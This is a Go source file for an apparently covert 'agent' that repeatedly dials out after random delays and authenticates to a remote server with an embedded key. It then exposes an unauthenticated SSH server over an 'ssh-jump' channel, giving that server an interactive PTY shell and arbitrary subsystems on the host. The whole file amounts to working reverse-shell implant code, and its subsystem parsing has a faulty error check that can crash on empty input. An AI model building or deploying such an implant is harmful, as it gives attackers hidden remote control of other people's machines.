package sshd

import (
	"agent/internal/config"
	"agent/internal/logger"
	"agent/internal/sshd/subsystems"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"time"

	"github.com/google/shlex"
	"golang.org/x/crypto/ssh"
)

type AgentConfig struct {
	metadata     string
	serverConfig *ssh.ServerConfig
	clientConfig *ssh.ClientConfig
}

func NewAgentConfig(metadata string) *AgentConfig {
	lg := logger.GetLogger()
	signer, err := ssh.ParsePrivateKey(config.GetPrivateKey())
	if err != nil {
		lg.Fatal("Failed to parse private key: %v", err)
	}

	agentConfig := &AgentConfig{
		metadata: metadata,
	}
	agentConfig.clientConfig = &ssh.ClientConfig{
		User:            metadata,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
		ClientVersion:   config.GetSSHClient(),
		HostKeyCallback: checkServerKey,
	}
	agentConfig.serverConfig = &ssh.ServerConfig{
		NoClientAuth: true,
	}
	agentConfig.serverConfig.AddHostKey(signer)

	return agentConfig
}

func checkServerKey(hostname string, remote net.Addr, key ssh.PublicKey) error {
	lg := logger.GetLogger()
	lg.Info("Checking server key for %s", hostname)

	if ssh.FingerprintSHA256(key) != string(config.GetFingerprint()) {
		lg.Fatal("Server key mismatch")
	}
	return nil
}

func (ac *AgentConfig) Start() error {
	for {
		time.Sleep(time.Duration(rand.IntN(10)) * time.Second)

		conn, addr := NewTCPConn()
		if conn == nil {
			continue
		}

		if err := ac.handleSSH(conn, addr); err != nil {
			lg := logger.GetLogger()
			lg.Error("Failed to handle SSH connection: %v", err)
			continue
		}
	}
}

func (ac *AgentConfig) handleSSH(tcpConn net.Conn, addr string) error {
	conn, chans, reqs, err := ssh.NewClientConn(tcpConn, addr, ac.clientConfig)
	if err != nil {
		return fmt.Errorf("failed to create SSH client connection: %v", err)
	}
	defer conn.Close()

	lg := logger.GetLogger()
	lg.Info("Connected to %s", conn.RemoteAddr())

	go ssh.DiscardRequests(reqs)
	for newChan := range chans {
		lg.Info("New client channel: %s", newChan.ChannelType())
		switch newChan.ChannelType() {
		case "ssh-jump":
			channel, _, err := newChan.Accept()
			if err != nil {
				lg.Error("Failed to accept channel: %v", err)
				newChan.Reject(ssh.ConnectionFailed, fmt.Sprintf("Failed to accept channel '%s': %v", newChan.ChannelType(), err))
				continue
			}
			go ac.handleJump(channel)
		default:
			lg.Warn("Unknown channel type: %s", newChan.ChannelType())
			newChan.Reject(ssh.UnknownChannelType, fmt.Sprintf("Unknown channel: %s", newChan.ChannelType()))
		}
	}

	lg.Warn("Closing SSH connection")
	return nil
}

func (ac *AgentConfig) handleJump(channel ssh.Channel) {
	lg := logger.GetLogger()
	lg.Info("Jump channel accepted")

	pAgent, pServer := net.Pipe()
	defer pServer.Close()
	defer pAgent.Close()

	go func() {
		_, err := io.Copy(channel, pServer)
		if err != nil {
			lg.Error("io channel<-pServer error: %v", err)
		}
	}()
	go func() {
		_, err := io.Copy(pServer, channel)
		if err != nil {
			lg.Error("io pServer<-channel error: %v", err)
		}
	}()

	conn, chans, reqs, err := ssh.NewServerConn(pAgent, ac.serverConfig)
	if err != nil {
		lg.Error("Failed to create SSH server connection")
		return
	}
	defer conn.Close()

	go ssh.DiscardRequests(reqs)
	for newChan := range chans {
		lg.Info("New server channel: %s", newChan.ChannelType())
		switch newChan.ChannelType() {
		case "session":
			channel, chanReqs, err := newChan.Accept()
			if err != nil {
				lg.Error("Failed to accept channel: %v", err)
				newChan.Reject(ssh.ConnectionFailed, fmt.Sprintf("Failed to accept channel '%s': %v", newChan.ChannelType(), err))
				continue
			}
			go ac.handleSession(channel, chanReqs)
		default:
			lg.Warn("Unknown channel type: %s", newChan.ChannelType())
			newChan.Reject(ssh.UnknownChannelType, fmt.Sprintf("Unknown channel: %s", newChan.ChannelType()))
		}
	}
}

func (ac *AgentConfig) handleSession(channel ssh.Channel, chanReqs <-chan *ssh.Request) {
	defer channel.Close()
	lg := logger.GetLogger()

	var shell sshShell
	for req := range chanReqs {
		lg.Info("New session request: %s", req.Type)
		switch req.Type {
		case "pty-req":
			var err error
			shell, err = NewShell()
			if err != nil {
				lg.Error("Failed to create shell: %v", err)
				req.Reply(false, nil)
				continue
			}

			err = shell.SetSize(req)
			if err != nil {
				lg.Error("Failed to set shell size: %v", err)
				req.Reply(false, nil)
				continue
			}

			req.Reply(true, nil)
		case "window-change":
			if shell == nil {
				lg.Error("Shell not initialized")
				req.Reply(false, nil)
				continue
			}

			err := shell.SetSize(req)
			if err != nil {
				lg.Error("Failed to set shell size: %v", err)
				req.Reply(false, nil)
				continue
			}

			req.Reply(true, nil)
		case "shell":
			if shell == nil {
				lg.Error("Shell not initialized")
				req.Reply(false, nil)
				continue
			}

			go shell.HandleShell(channel)
			req.Reply(true, nil)
		case "subsystem":
			lg.Info("Subsystem request: %s", req.Type)

			line := string(req.Payload[4:])
			args, err := shlex.Split(line)
			if err != nil && len(args) > 0 {
				lg.Error("Failed to parse subsystem command: %v", err)
				req.Reply(false, nil)
				continue
			}

			subsystem := args[0]
			subsystemArgs := []string{}
			if len(args) > 1 {
				subsystemArgs = args[1:]
			}
			if subsystemFunc, ok := subsystems.Subsystems[subsystem]; ok {
				lg.Info("Subsystem function found: %s", subsystem)
				go subsystemFunc(channel, subsystemArgs)
				req.Reply(true, nil)
			} else {
				lg.Error("Subsystem not supported: %s", subsystem)
				channel.Write([]byte(fmt.Sprintf("Subsystem not supported: %s\n", subsystem)))
				req.Reply(false, nil)
			}
		default:
			lg.Warn("Unknown request: %s", req.Type)
			req.Reply(false, nil)
		}
	}
}
